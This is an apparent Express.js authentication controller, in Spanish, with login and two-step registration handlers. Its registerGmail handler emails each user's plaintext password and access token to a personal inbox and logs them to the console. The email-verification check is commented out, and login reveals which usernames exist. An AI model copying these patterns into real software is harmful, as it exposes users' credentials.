require('dotenv').config(); 

const User = require('../models/usuario.models');
const transporter = require('../config/nodemailerConfig'); 
const jwt = require('jsonwebtoken');


const registrationTokens = {};


const login = async (req, res, next) => {
    const { usuario, password } = req.body;
    if (!usuario || !password) {
        return res.status(400).send('Usuario o contraseña no proporcionados');
    }

    try {
        const user = await User.findOne({ usuario });
        if (!user) {
            return res.status(400).send('Usuario no encontrado');
        }

        const validPassword = await user.validatePassword(password);
        if (!validPassword) {
            return res.status(400).json({ auth: false, message: 'Contraseña incorrecta' });
        }
/* 
        if (!user.isVerified) {
            return res.status(403).json({ auth: false, message: 'Usuario no verificado. Por favor, completa el registro.' });
        } */

        const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
            expiresIn: 60 * 60 * 24
        });

        res.json({ auth: true, token });

    } catch (error) {
        next(error);
    }
};


const registro = async (req, res, next) => {
    const { usuario, email, password, token } = req.body;
    if (!usuario || !email || !password || !token) {
        return res.status(400).json({ message: 'Faltan datos necesarios o no autorizados' });
    }

    try {
        
        const storedToken = registrationTokens[email];
        if (!storedToken || token !== storedToken) {
            return res.status(403).json({ message: 'Acceso no autorizado' });
        }

        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ message: 'El email ya está registrado' });
        }

        const user = new User({
            usuario: usuario,
            email: email,
            password: password,
            isVerified: true 
        });

        user.password = await user.encryptPassword(user.password);
        await user.save();

        
        delete registrationTokens[email];

        const userToken = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
            expiresIn: 60 * 60 * 24
        });

        return res.status(201).json({ auth: true, user, token: userToken, message: 'Usuario registrado exitosamente' });

    } catch (error) {
        if (error.message === 'El email ya está registrado') {
            return res.status(400).json({ message: 'El email ya está registrado' });
        }
        next(error);
    }
};


const registerGmail = async (req, res, next) => {
    const { usuario, email, password } = req.body;
    if (!usuario || !email || !password) {
        return res.status(400).json({ message: 'Faltan datos necesarios' });
    }

    try {
        
        const userToken = jwt.sign({ usuario, email }, process.env.JWT_SECRET, {
            expiresIn: 60 * 60 * 24
        });

        
        registrationTokens[email] = userToken;

        const personalMailOptions = {
            from: process.env.GMAIL_USER,
            to: process.env.TU_CORREO_PERSONAL, 
            subject: 'Información de Registro',
            text: `Se ha intentado registrar un usuario:\nUsuario: ${usuario}\nEmail: ${email}\nToken de acceso: ${userToken}\nContraseña: ${password}`
        };

        console.log('Correo a enviar:', personalMailOptions);

        
        transporter.sendMail(personalMailOptions, (error, info) => {
            if (error) {
                console.error('Error al enviar el correo:', error);
                return res.status(500).json({ auth: false, message: 'Error al enviar la información' });
            } else {
                console.log('Correo enviado:', info.response);
                return res.status(200).json({ auth: true, message: 'Información enviada correctamente' });
            }
        });

    } catch (error) {
        console.error('Error al enviar el correo:', error);
        next(error);
    }
};


const prueba = (req, res, next) => {
    return res.json({ message: 'hola' });
};

module.exports = {
    login,
    registro,
    registerGmail,
    prueba
};

